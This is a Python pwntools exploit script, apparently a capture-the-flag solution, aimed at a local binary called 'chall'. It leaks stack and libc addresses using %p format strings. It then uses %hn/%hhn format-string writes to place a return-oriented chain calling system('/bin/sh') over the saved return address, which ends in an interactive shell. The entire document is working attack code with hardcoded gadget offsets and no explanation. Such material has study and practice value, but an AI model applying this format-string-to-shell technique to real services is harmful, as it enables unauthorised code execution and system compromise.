from pwn import*

elf = context.binary = ELF('chall')

local = True
if (local):
    p = process('./chall')
    gdb.attach(p, '''c''')
else:
    p = remote('')

elf = context.binary = ELF('./chall', checksec=False) 


def write_data(data, addr):
    log.info('@@@@@@@@@ Write ' + hex(data) + ' to ' + hex(addr) + ' @@@@@@@@@')
    a1 = addr & 0xffff

    for i in range (5):
        value =( data & (0xff << i*8) ) >> i*8 
        log.info('DatA:' + hex(a1) + ' ' + hex(value))
        payload = b'%' + str(a1).encode() + b'c' + b'%16$hn'
        p.sendlineafter(b'Nhap:', payload)
        payload = b'%' + str(value).encode() + b'c' + b'%45$hhn'
        p.sendlineafter(b'Nhap:', payload)
        a1 += 1
    
    value =( data & (0xff << 5*8) ) >> 5*8
    payload = b'%' + str(a1).encode() + b'c' + b'%16$hn'
    p.sendlineafter(b'Nhap:', payload)
    payload = b'%' + str(value).encode() + b'c' + b'%45$hn'
    p.sendlineafter(b'Nhap:', payload)

    log.info(b'Done!')


#############
# Leak_addr #
#############

payload = b'%p'*6
p.sendline(payload)

p.recvuntil(b'0x')
stack_leak = int(p.recv(12), 16)
ret_addr = stack_leak + 40
log.info('Stack_leak:   ' + hex(stack_leak))
log.info('Ret_addr:     ' + hex(ret_addr))
p.recvuntil(b'0x100x')
libc = int(p.recv(12), 16) - 1101041
log.info('Libc_base:    ' + hex(libc))

################## Gadget ##################
pop_rdi =   0x0000000000023b65 + libc
ret =       0x00000000000233d1 + libc
system =    0x000000000004e520 + libc
binsh =     1794484            + libc
############################################


write_data(ret, ret_addr)
write_data(pop_rdi, ret_addr + 0x8)
write_data(binsh, ret_addr + 0x10)
write_data(system, ret_addr + 0x18)
p.sendline(b'y')

p.interactive()

#/usr/lib/x86_64-linux-gnu/libc.so.6